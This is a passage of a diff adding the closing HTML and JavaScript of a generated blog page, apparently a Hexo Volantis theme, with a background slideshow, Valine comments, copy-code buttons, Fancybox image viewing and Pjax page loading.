"/static/images/46.jpg", "/static/images/47.jpg", "/static/images/48.jpg", "/static/images/49.jpg", "/static/images/50.jpg", "/static/images/51.jpg", "/static/images/52.jpg", "/static/images/53.jpg", "/static/images/54.jpg", "/static/images/55.jpg", "/static/images/56.jpg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg"];
+        if ('true' == 'true') {
+          function shuffle(arr){
+            /*From countercurrent-time*/
+            var n = arr.length;
+            while(n--) {
+              var index = Math.floor(Math.random() * n);
+              var temp = arr[index];
+              arr[index] = arr[n];
+              arr[n] = temp;
+            }
+          }
+          shuffle(imgs);
+        }
+        if ('.cover') {
+          $('.cover').backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        } else {
+          $.backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        }
+      });
+    </script>
+  
+
+
+
+
+
+
+  
+  
+<script src="/js/valine.js"></script>
+
+
+<script>
+  var GUEST_INFO = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link'.split(',').filter(function (item) {
+    return GUEST_INFO.indexOf(item) > -1
+  });
+  var REQUIRED_FIELDS = ['nick', 'mail', 'link'];
+  var requiredFields = 'nick,mail'.split(',').filter(function (item) {
+    return REQUIRED_FIELDS.indexOf(item) > -1
+  });
+
+  function emoji(path, idx, ext) {
+    return path + "/" + path + "-" + idx + "." + ext;
+  }
+
+  var emojiMaps = {};
+  for (var i = 1; i <= 54; i++) {
+    emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+  }
+  for (var i = 1; i <= 101; i++) {
+    emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+  }
+  for (var i = 1; i <= 116; i++) {
+    emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+  }
+  for (var i = 1; i <= 125; i++) {
+    emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+  }
+  for (var i = 1; i <= 4; i++) {
+    emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+  }
+
+  function pjax_valine() {
+    let pageUrl = $.trim($('#pjax-comment-path').text()) === "none" ? 
+      decodeURI(window.location.pathname) : $.trim($('#pjax-comment-path').text());
+    let pagePlaceholder = $.trim($('#pjax-comment-placeholder').text()) === "none" ?
+      "快来评论吧~" : $.trim($('#pjax-comment-placeholder').text());
+
+    let ALLPATH = '';
+    if(ALLPATH != '') pageUrl = ALLPATH;
+
+    var valine = new Valine();
+    valine.init({
+      el: '#valine_container',
+      meta: meta,
+      placeholder: pagePlaceholder,
+      path: pageUrl,
+      appId: "or2NepulP8NGKXehq1IRSQTc-gzGzoHsz",
+      appKey: "lRlc11XLlqK4AeDJeNJxo17y",
+      pageSize: '10',
+      avatar: 'robohash',
+      lang: 'zh-cn',
+      visitor: 'true',
+      highlight: 'true',
+      mathJax: 'false',
+      enableQQ: 'true',
+      requiredFields: requiredFields,
+      emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+      emojiMaps: emojiMaps
+    })
+  }
+
+  $(function () {
+    pjax_valine();
+  });
+</script>
+
+
+
+
+<!-- darkmodejs -->
+
+
+<!-- 复制 -->
+
+  <script src="/static/js-css/clipboard.min.js"></script>
+<script>
+    var clipboard = new ClipboardJS('.btn-copy', {
+        target: function (trigger) {
+            return trigger.nextElementSibling
+        }
+    });
+    function wait(callback, seconds) {
+        var timelag = null;
+        timelag = window.setTimeout(callback, seconds)
+    }
+    function pjax_initCopyCode() {
+        var copyHtml = '';
+        copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+        copyHtml += '<i class="fas fa-copy"></i><span>COPY</span>';
+        copyHtml += '</button>';
+        $(".highlight .code pre").before(copyHtml);
+        $(".article pre code").before(copyHtml);
+        clipboard.off('success').on('success', function (e) {
+            let $btn = $(e.trigger);
+            $btn.addClass('copied');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-check-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPIED';
+            wait(function () {
+                $icon.removeClass('fa-check-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        });
+        clipboard.off('error').on('error', function (e) {
+            e.clearSelection();
+            let $btn = $(e.trigger);
+            $btn.addClass('copy-failed');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-times-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPY FAILED';
+            wait(function () {
+                $icon.removeClass('fa-times-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        })
+    }
+    $(function () {
+        pjax_initCopyCode()
+    });
+</script>
+
+
+<!-- scrollreveal -->
+
+  <script src="/static/js-css/scrollreveal.min.js"></script>
+  <script type="text/javascript">
+    function pjax_scrollrebeal() {
+      ScrollReveal().reveal('.l_main .reveal', {
+        distance: '32px',
+        duration: '800',
+        interval: '20',
+        scale: '1',
+        easing: 'ease-out'
+      });
+    }
+
+    $(function () {
+      pjax_scrollrebeal();
+    });
+  </script>
+
+<!-- ******************************** -->
+
+<!-- fancybox -->
+<script src="/static/js-css/jquery.fancybox.min.js"></script>
+<script>
+  function pjax_fancybox() {
+    $(".article-entry").find("img").not('.inline').not('a img').each(function () { //渲染 fancybox
+      var element = document.createElement("a"); // a 标签
+      $(element).attr("class", "fancybox");
+      $(element).attr("pjax-fancybox", "");  // 过滤 pjax
+      $(element).attr("href", $(this).attr("src"));
+      if ($(this).attr("data-original")) {
+        $(element).attr("href", $(this).attr("data-original"));
+      }
+      $(element).attr("data-fancybox", "images");
+      var caption = "";   // 描述信息
+      if ($(this).attr('alt')) {  // 判断当前页面是否存在描述信息
+        $(element).attr('data-caption', $(this).attr('alt'));
+        caption = $(this).attr('alt');
+      }
+      var div = document.createElement("div");
+      $(div).addClass("fancybox");
+      $(this).wrap(div); // 最外层套 div ，其实主要作用还是 class 样式
+      var span = document.createElement("span");
+      $(span).addClass("image-caption");
+      $(span).text(caption); // 加描述
+      $(this).after(span);  // 再套一层描述
+      $(this).wrap(element);  // 最后套 a 标签
+    })
+    $(".article-entry").find("img").fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+      closeClick: true,
+      helpers: {
+        overlay: {closeClick: true}
+      },
+      buttons: [
+        "zoom",
+        "close"
+      ]
+    });
+  };
+  $(function () {
+    pjax_fancybox();
+  });
+</script>
+
+<!-- ******************************** -->
+
+
+  
+<script src="/js/app.js"></script>
+
+
+
+
+  
+    
+<script src="/js/search.js"></script>
+
+  
+
+
+
+  <script defer src="/static/js-css/busuanzi.pure.mini.js" data-pjax></script>
+
+
+
+  
+<script src="/static/js-css/waves.min.js"></script>
+
+  <script type="text/javascript">
+    $(function () {
+      Waves.attach('.flat-btn', ['waves-button']);
+      Waves.attach('.float-btn', ['waves-button', 'waves-float']);
+      Waves.attach('.float-btn-light', ['waves-button', 'waves-float', 'waves-light']);
+      Waves.attach('.flat-box', ['waves-block']);
+      Waves.attach('.float-box', ['waves-block', 'waves-float']);
+      Waves.attach('.waves-image');
+      Waves.init();
+    });
+  </script>
+
+
+
+  
+<script src="/static/js-css/comment_typing.js"></script>
+
+
+
+
+
+
+
+    
+      
+
+
+<script src="/static/js-css/pjax.min.js"></script>
+
+<!-- 样式位于：source/css/_third-party/pjaxanimate.styl -->
+
+<div class="pjax-animate">
+  
+    <script src="/static/js-css/nprogress.min.js"></script>
+    <div id="loading-bar-wrapper"><script>NProgress.configure({parent:"#loading-bar-wrapper",trickleSpeed: 100})</script></div>
+    <script>
+      window.ShowLoading = function() {
+        NProgress.start();
+      };
+      window.HideLoading = function() {
+        NProgress.done();
+      }
+    </script>
+  
+</div>
+
+<script>
+    var pjax;
+    document.addEventListener('DOMContentLoaded', function () {
+      pjax = new Pjax({
+        elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([pjax-fancybox])',
+        selectors: [
+          "title",
+          "#pjax-container",
+          "#pjax-header-nav-list"
+        ],
+        cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+        timeout: 5000
+      });
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+      window.stop(); // 相当于点击了浏览器的停止按钮
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      window.subData = null; // 移除标题（用于一二级导航栏切换处）
+      $.fancybox.close();    // 关闭弹窗
+      $('.l_header .switcher .s-search').removeClass('active'); // 关闭移动端激活的搜索框
+      $('.l_header').removeClass('z_search-open'); // 关闭移动端激活的搜索框
+      $('.wrapper').removeClass('sub'); // 跳转页面时关闭二级导航
+
+      // 解绑事件 避免重复监听
+      $('.s-top').unbind('click');
+      $('.menu a').unbind('click');
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+      window.ShowLoading();
+    });
+
+    document.addEventListener('pjax:complete', function () {
+      // 关于百度统计对 SPA 页面的处理：
+      // 方案一：百度统计>管理>单页应用设置中，打开开启按钮即可对SPA进行统计。 https://tongji.baidu.com/web/help/article?id=324
+      // 方案二：取消注释下列代码。 https://tongji.baidu.com/web/help/article?id=235
+      // 
+
+      // 关于谷歌统计对 SPA 页面的处理：
+      // 当应用以动态方式加载内容并更新地址栏中的网址时，也应该更新通过 gtag.js 存储的网页网址。
+      // https://developers.google.cn/analytics/devguides/collection/gtagjs/single-page-applications?hl=zh-cn
+      
+
+      $('.nav-main').find('.list-v').not('.menu-phone').removeAttr("style",""); // 移除小尾巴的移除
+      $('.menu-phone.list-v').removeAttr("style",""); // 移除小尾巴的移除
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+
+      try{
+        pjax_fancybox();
+        
+          
+          if ('.cover') {
+            $('.cover').backstretch("resize");
+          } else {
+            $.backstretch("resize");
+          }
+        
+        
+        
+          pjax_scrollrebeal();
+        
+        
+          pjax_initCopyCode();
+        
+        
+          pjax_valine();
+        
+        
+        
+        
+        
+      } catch (e) {
+        console.log(e);
+      }
+      window.HideLoading();
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+      window.HideLoading();
+      window.location.href = e.triggerElement.href;
+    });
+</script>
+
+    
+  </div>
+</body>
+</html>
